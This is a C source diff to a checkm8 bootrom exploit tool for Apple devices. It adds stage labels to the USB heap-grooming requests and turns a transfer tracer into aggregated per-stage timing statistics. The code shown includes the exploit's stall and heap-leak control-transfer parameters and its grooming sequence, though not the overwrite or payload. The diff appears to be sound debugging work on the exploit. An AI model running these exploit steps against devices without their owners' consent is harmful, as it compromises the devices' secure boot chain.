@@ -136,18 +136,23 @@ static int msleep(long msec) {
     return res;
 }
 
-static int usb_req_stall(irecv_client_t client) {
-    return tracedTransfer(client, "groom/stall", 0x2, 3, 0x0, 0x80, NULL, 0, 10);
+// `phase` distinguishes the two separate grooming passes in the checkm8
+// sequence -- the big pre-bug-setup one and the single-leak one right before
+// the overwrite. Without it the tracer merges them into one row and the
+// second pass, which is the one adjacent to the transfer under
+// investigation, becomes invisible.
+static int usb_req_stall(irecv_client_t client, const char* phase) {
+    return tracedTransfer(client, phase, 0x2, 3, 0x0, 0x80, NULL, 0, 10);
 }
 
-static int usb_req_leak(irecv_client_t client) {
+static int usb_req_leak(irecv_client_t client, const char* phase) {
     unsigned char buf[0x40];
-    return tracedTransfer(client, "groom/leak", 0x80, 6, 0x304, 0x40A, buf, 0x40, 1);
+    return tracedTransfer(client, phase, 0x80, 6, 0x304, 0x40A, buf, 0x40, 1);
 }
 
-static int usb_req_no_leak(irecv_client_t client) {
+static int usb_req_no_leak(irecv_client_t client, const char* phase) {
     unsigned char buf[0x41];
-    return tracedTransfer(client, "groom/no-leak", 0x80, 6, 0x304, 0x40A, buf, 0x41, 1);
+    return tracedTransfer(client, phase, 0x80, 6, 0x304, 0x40A, buf, 0x41, 1);
 }
 
 // checkm8 deliberately induces a pipe stall as its first exploit step, and
@@ -224,6 +229,14 @@ static int isTransferTimeout(int ret) {
 
 #define kMaxTraceRecords 256
 
+// One row per distinct (stage, outcome), not per transfer. The checkm8
+// sequence issues config.large_leak identical heap-leak requests in a row --
+// 626 of them on S5L8947X -- and a per-transfer table would be 626 rows of
+// the same line, would overflow any sane fixed array, and would push the
+// OVERWRITE row (the single most important one, and the last to be recorded)
+// off the end. Aggregating collapses that to one row carrying the repeat
+// count and the elapsed-time spread, which is strictly more informative than
+// 626 copies.
 typedef struct {
     const char* label;
     uint8_t bmRequestType;
@@ -233,7 +246,10 @@ typedef struct {
     uint16_t wLength;
     int ret;
     int transferred;
-    unsigned long elapsedUs;
+    unsigned long count;
+    unsigned long minUs;
+    unsigned long maxUs;
+    unsigned long totalUs;
 } trace_record_t;
 
 static trace_record_t traceRecords[kMaxTraceRecords];
@@ -275,8 +291,24 @@ static int tracedTransferEx(irecv_client_t client, const char* label,
 
     if (tracingEnabled()) {
         unsigned long elapsed = nowUs() - started;
-        if (traceCount < kMaxTraceRecords) {
-            trace_record_t* r = &traceRecords[traceCount++];
+        trace_record_t* r = NULL;
+
+        // Merge into an existing row for the same stage AND the same outcome.
+        // Scanning all rows rather than just the last one matters: a leak loop
+        // that mostly times out but occasionally does not would otherwise
+        // alternate between two rows and fragment into hundreds. Bounded by
+        // the number of distinct (stage, ret, moved) triples, which is single
+        // digits in practice -- and it only runs when tracing is on.
+        for (size_t i = 0; i < traceCount; i++) {
+            if (traceRecords[i].label == label && traceRecords[i].ret == ret &&
+                traceRecords[i].transferred == moved && traceRecords[i].wLength == wLength) {
+                r = &traceRecords[i];
+                break;
+            }
+        }
+
+        if (!r && traceCount < kMaxTraceRecords) {
+            r = &traceRecords[traceCount++];
             r->label = label;
             r->bmRequestType = bmRequestType;
             r->bRequest = bRequest;
@@ -285,7 +317,17 @@ static int tracedTransferEx(irecv_client_t client, const char* label,
             r->wLength = wLength;
             r->ret = ret;
             r->transferred = moved;
-            r->elapsedUs = elapsed;
+            r->count = 0;
+            r->minUs = (unsigned long)-1;
+            r->maxUs = 0;
+            r->totalUs = 0;
+        }
+
+        if (r) {
+            r->count++;
+            r->totalUs += elapsed;
+            if (elapsed < r->minUs) r->minUs = elapsed;
+            if (elapsed > r->maxUs) r->maxUs = elapsed;
         } else {
             traceDropped++;
         }
@@ -308,15 +350,17 @@ static int tracedTransfer(irecv_client_t client, const char* label,
 static void traceFlush(void) {
     if (!tracingEnabled() || traceCount == 0) return;
 
-    printf("\n--- transfer trace (%zu records%s) ---\n", traceCount,
+    printf("\n--- transfer trace (%zu rows%s) ---\n", traceCount,
            traceDropped ? ", TRUNCATED" : "");
-    printf("%-26s %4s %4s %6s %6s %6s %8s %6s %10s\n",
-           "stage", "type", "req", "value", "index", "len", "ret", "moved", "elapsed_us");
+    printf("%-16s %4s %4s %6s %6s %6s %7s %6s %6s %9s %9s %9s\n",
+           "stage", "type", "req", "value", "index", "len", "ret", "moved",
+           "n", "min_us", "mean_us", "max_us");
     for (size_t i = 0; i < traceCount; i++) {
         const trace_record_t* r = &traceRecords[i];
-        printf("%-26s 0x%02x 0x%02x 0x%04x 0x%04x %6u %8d %6d %10lu%s\n",
+        printf("%-16s 0x%02x 0x%02x 0x%04x 0x%04x %6u %7d %6d %6lu %9lu %9lu %9lu%s\n",
                r->label, r->bmRequestType, r->bRequest, r->wValue, r->wIndex,
-               (unsigned)r->wLength, r->ret, r->transferred, r->elapsedUs,
+               (unsigned)r->wLength, r->ret, r->transferred, r->count,
+               r->minUs, r->count ? r->totalUs / r->count : 0, r->maxUs,
                isPipeStall(r->ret) ? "  (stall)"
                                    : (isTransferTimeout(r->ret) ? "  (timeout)" : ""));
     }
@@ -695,7 +739,7 @@ static int runCheckm8Inner(uint64_t ecid) {
 
     puts("Exploiting with checkm8");
 
-    ret = usb_req_stall(client);
+    ret = usb_req_stall(client, "groom1/stall");
     if (!isPipeStall(ret) && groomFailure("Failed to stall pipe", ret)) {
         free(config.payload);
         irecv_close(client);
@@ -707,7 +751,7 @@ static int runCheckm8Inner(uint64_t ecid) {
     int leakFailures = 0;
     int lastLeakFailure = 0;
     for (int i = 0; i < config.large_leak; i++) {
-        ret = usb_req_leak(client);
+        ret = usb_req_leak(client, "groom1/leak");
         if (!isTransferTimeout(ret)) {
             // Counted rather than reported per iteration: with
             // DEBUG_IGNORE_GROOM_ERRORS set this can fire hundreds of
@@ -729,7 +773,7 @@ static int runCheckm8Inner(uint64_t ecid) {
                leakFailures, (int)config.large_leak, lastLeakFailure);
     }
 
-    ret = usb_req_no_leak(client);
+    ret = usb_req_no_leak(client, "groom1/no-leak");
     if (!isTransferTimeout(ret) && groomFailure("Failed to create heap hole (no-leak)", ret)) {
         free(config.payload);
         irecv_close(client);
@@ -800,7 +844,7 @@ static int runCheckm8Inner(uint64_t ecid) {
 
     puts("Grooming heap");
 
-    ret = usb_req_stall(client);
+    ret = usb_req_stall(client, "groom2/stall");
     if (!isPipeStall(ret) && groomFailure("Failed to stall pipe", ret)) {
         free(config.payload);
         irecv_close(client);
@@ -809,7 +853,7 @@ static int runCheckm8Inner(uint64_t ecid) {
 
     usleep(100);
 
-    ret = usb_req_leak(client);
+    ret = usb_req_leak(client, "groom2/leak");
     if (!isTransferTimeout(ret) && groomFailure("Failed to create heap hole", ret)) {
         free(config.payload);
         irecv_close(client);
